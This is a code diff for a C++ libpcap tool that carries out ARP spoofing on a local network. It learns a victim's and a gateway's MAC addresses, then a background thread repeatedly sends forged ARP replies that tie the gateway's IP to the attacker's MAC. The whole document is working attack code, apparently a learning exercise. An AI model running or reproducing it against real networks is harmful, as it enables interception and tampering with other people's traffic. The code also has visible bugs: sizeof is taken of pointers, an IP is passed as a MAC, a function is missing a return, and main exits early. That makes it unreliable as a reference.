@@ -7,26 +7,19 @@
 #include <arpa/inet.h>
 #include <thread>
 
-void arp_infection(pcap_t *handle);
+u_char my_mac[] = {0x24, 0xf5, 0xaa, 0x75, 0xa4, 0xdf};
+u_int8_t my_ip[] = {0xc0, 0xa8, 0xc8, 0x7b};
+u_char brod_eth_mac[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+u_int8_t brod_arp_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+u_int8_t sender_ip[] = {0xc0, 0xa8, 0xc8, 0x85};
+u_int8_t receiver_ip[] = {0xc0, 0xa8, 0xc8, 0xfe};
 
-void print_bytes(u_int8_t *bytes, int size) {
-    for(int i=1; i<=size; i++) {
-        printf("%02x ", bytes[i-1]);
-        if(i!=1 && i%16==0) {
-            printf("\n");
-        } else if(i!=1 && i%8==0) {
-            printf(" ");
-        }
-    }
-    printf("\n");
-}
 
 struct eth_hdr {
     u_int8_t eth_dmac[6];   // ether destination mac주소
     u_int8_t eth_smac[6];  // ether source mac주소
     u_int16_t eth_type;   // ether type
 };
-
 struct arp_req {
     u_int16_t arp_hwtype;   // ARP 패킷의 하드웨어 타입
     u_int16_t arp_protype;  // ARP 패킷의 프로토콜 타입
@@ -44,8 +37,15 @@ struct eth_arp_req {
     arp_req arp;
 };
 
+u_int8_t *reply_mac(const u_char *packet);
+void arp_infection(pcap_t *handle, u_int8_t *sender_mac, u_int8_t *receiver_mac);
+
 int main()
 {
+    const u_char *packet;
+    struct pcap_pkthdr pcap_header;
+    u_int8_t *sender_mac;
+    u_int8_t *receiver_mac;
     pcap_t *handle;
     char *dev = "wlan0";
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -54,11 +54,10 @@ int main()
         fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
         return(2);
     }
+
     eth_hdr eth;
-    u_char eth_dmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-    memcpy(eth.eth_dmac, eth_dmac, sizeof(eth_dmac));
-    u_char eth_smac[6] = {0x24, 0xf5, 0xaa, 0x75, 0xa4, 0xdf};
-    memcpy(eth.eth_smac, eth_smac, sizeof(eth_smac));
+    memcpy(eth.eth_dmac, brod_eth_mac, sizeof(brod_eth_mac));
+    memcpy(eth.eth_smac, my_mac, sizeof(my_mac));
     eth.eth_type = htons(ETH_P_ARP);
     arp_req arp;
     arp.arp_hwtype = htons(ARPHRD_ETHER);
@@ -66,42 +65,63 @@ int main()
     arp.arp_hlen = sizeof(eth.eth_dmac);
     arp.arp_plen = sizeof(arp.arp_sipaddr);
     arp.arp_opr = htons(ARPOP_REQUEST);
-    u_int8_t arp_shwaddr[6] = {0x24, 0xf5, 0xaa, 0x75, 0xa4, 0xdf};
-    memcpy(arp.arp_shwaddr, arp_shwaddr, sizeof(arp_shwaddr));
-    u_int8_t arp_sproaddr[4] = {0xc0, 0xa8, 0xc8, 0x7b};
-    memcpy(arp.arp_sipaddr, arp_sproaddr, sizeof(arp_sproaddr));
-    u_int8_t arp_thwaddr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-    memcpy(arp.arp_thwaddr, arp_thwaddr, sizeof(arp_thwaddr));
-    u_int8_t arp_tproaddr[4] = {0xc0, 0xa8, 0xc8, 0x85};
-    memcpy(arp.arp_tproaddr, arp_tproaddr, sizeof(arp_tproaddr));
+    memcpy(arp.arp_shwaddr, my_mac, sizeof(my_mac));
+    memcpy(arp.arp_sipaddr, my_ip, sizeof(my_ip));
+    memcpy(arp.arp_thwaddr, brod_arp_mac, sizeof(brod_arp_mac));
+    memcpy(arp.arp_tproaddr, sender_ip, sizeof(sender_ip));
 
     eth_arp_req req;
     req.eth = eth;
     req.arp = arp;
 
-    print_bytes((u_int8_t*) &req, sizeof(req));
+        if (pcap_sendpacket(handle,(const u_char*)&req ,(sizeof(req))) != 0)
+        {
+            printf("arp error\n");
+        }
+        else
+        {
+            printf("arp send\n");
+            packet = pcap_next(handle,&pcap_header);
+            sender_mac=reply_mac(packet);
+        }
 
-    if (pcap_sendpacket(handle,(const u_char*)&req ,(sizeof(req))) != 0)
-    {
-        printf("arp error\n");
-    }
-    else
-    {
-        printf("arp send\n");
-    }
+        memcpy(arp.arp_tproaddr, receiver_ip, sizeof(receiver_ip));
+        req.eth = eth;
+        req.arp = arp;
 
-    std::thread(arp_infection, handle).detach();
-
-    pcap_close(handle);
+        if (pcap_sendpacket(handle,(const u_char*)&req ,(sizeof(req))) != 0)
+        {
+            printf("arp error\n");
+        }
+        else
+        {
+            printf("arp send\n");
+            packet = pcap_next(handle,&pcap_header);
+            receiver_mac=reply_mac(packet);
+        }
+        std::thread(arp_infection, handle, sender_mac, sender_ip).detach();
 }
 
-void arp_infection(pcap_t *handle)
+u_int8_t *reply_mac(const u_char *packet)
+{
+    char buf[24];
+    libnet_ethernet_hdr *ethernet_hdr = (libnet_ethernet_hdr *) packet;
+    if(ntohs(ethernet_hdr->ether_type) == ETHERTYPE_ARP)
+    {
+        libnet_arp_hdr *arp_hdr = (libnet_arp_hdr *)(packet + sizeof(libnet_ethernet_hdr));
+        if((ntohs(arp_hdr->ar_op) == ARPOP_REPLY))
+        {
+            printf("sender mac -> %s\n", ether_ntoa_r((ether_addr*)ethernet_hdr->ether_shost, buf));
+            return(ethernet_hdr->ether_shost);
+        }
+    }
+}
+
+void arp_infection(pcap_t *handle, u_int8_t *sender_mac, u_int8_t *receiver_mac)
 {
     eth_hdr eth_h;
-    u_char eth_dmac[6] = {0x48, 0x59, 0x29, 0xf4, 0xa5, 0x87};//감염시킬 sender의 mac
-    memcpy(eth_h.eth_dmac, eth_dmac, sizeof(eth_dmac));
-    u_char eth_smac[6] = {0x24, 0xf5, 0xaa, 0x75, 0xa4, 0xdf};
-    memcpy(eth_h.eth_smac, eth_smac, sizeof(eth_smac));
+    memcpy(eth_h.eth_dmac, sender_mac, sizeof(sender_mac));//감염시킬 sender의 mac
+    memcpy(eth_h.eth_smac, my_mac, sizeof(my_mac));
     eth_h.eth_type = htons(ETH_P_ARP);
     arp_req arp_h;
     arp_h.arp_hwtype = htons(ARPHRD_ETHER);
@@ -109,14 +129,10 @@ void arp_infection(pcap_t *handle)
     arp_h.arp_hlen = sizeof(eth_h.eth_dmac);
     arp_h.arp_plen = sizeof(arp_h.arp_sipaddr);
     arp_h.arp_opr = htons(ARPOP_REPLY);
-    u_int8_t arp_shwaddr[6] = {0x24, 0xf5, 0xaa, 0x75, 0xa4, 0xdf};
-    memcpy(arp_h.arp_shwaddr, arp_shwaddr, sizeof(arp_shwaddr));
-    u_int8_t arp_sproaddr[4] = {0xc0, 0xa8, 0xc8, 0xfe};//gateway의 ip
-    memcpy(arp_h.arp_sipaddr, arp_sproaddr, sizeof(arp_sproaddr));
-    u_int8_t arp_thwaddr[6] = {0x48, 0x59, 0x29, 0xf4, 0xa5, 0x87};//감염시킬 sender의 mac
-    memcpy(arp_h.arp_thwaddr, arp_thwaddr, sizeof(arp_thwaddr));
-    u_int8_t arp_tproaddr[4] = {0xc0, 0xa8, 0xc8, 0x85};//감염시킬 sender의 ip
-    memcpy(arp_h.arp_tproaddr, arp_tproaddr, sizeof(arp_tproaddr));
+    memcpy(arp_h.arp_shwaddr, my_mac, sizeof(my_mac));
+    memcpy(arp_h.arp_sipaddr, receiver_ip, sizeof(receiver_ip));//gateway의 ip
+    memcpy(arp_h.arp_thwaddr, sender_mac, sizeof(sender_mac));//감염시킬 sender의 mac
+    memcpy(arp_h.arp_tproaddr, sender_ip, sizeof(sender_ip));//감염시킬 sender의 ip
 
     eth_arp_req infect;
     infect.eth = eth_h;
@@ -134,4 +150,5 @@ void arp_infection(pcap_t *handle)
         }
         sleep(1);
     }
+    pcap_close(handle);
 }
